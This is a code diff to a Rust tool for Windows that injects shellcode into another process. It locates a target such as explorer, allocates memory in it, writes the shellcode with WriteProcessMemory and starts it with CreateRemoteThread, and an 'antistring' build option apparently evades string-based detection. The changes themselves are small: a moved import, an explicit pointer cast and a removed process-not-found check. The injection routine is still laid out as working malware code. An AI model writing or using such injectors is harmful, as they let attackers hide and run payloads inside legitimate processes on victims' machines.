@@ -1,4 +1,5 @@
 extern crate windows;
+use core::ffi::c_void;
 use std::{mem, ptr};
 use windows::Win32::Foundation::CHAR;
 use windows::Win32::System::Diagnostics::ToolHelp::{PROCESSENTRY32, TH32CS_SNAPPROCESS};
@@ -12,8 +13,6 @@ use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Pr
 use windows::Win32::System::Memory::VirtualAllocEx;
 #[cfg(not(feature = "antistring"))]
 use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess};
-#[cfg(feature = "antistring")]
-use core::ffi::c_void;
 #[cfg(feature = "antistring")]
 use windows::Win32::Foundation::{BOOL, HANDLE};
 #[cfg(feature = "antistring")]
@@ -77,7 +76,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // Call WriteProcessMemory to write the contents of the shellcode into the memory allocated above
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/Debug/fn.WriteProcessMemory.html
-    let write_result = unsafe { WriteProcessMemory(explorer_handle, base_address, shellcode.as_ptr() as _, shellcode.len(), ptr::null_mut()) };
+    let write_result = unsafe { WriteProcessMemory(explorer_handle, base_address, shellcode.as_ptr() as *const c_void, shellcode.len(), ptr::null_mut()) };
     if !write_result.as_bool() {
         panic!("WriteProcessMemory failed");
     }
@@ -121,9 +120,6 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
             pid = process_entry.th32ProcessID;
             break;
         }
-    }
-    if pid == 0 {
-        panic!("Could not find a {target_process} process");
     }
 
     // See line 62
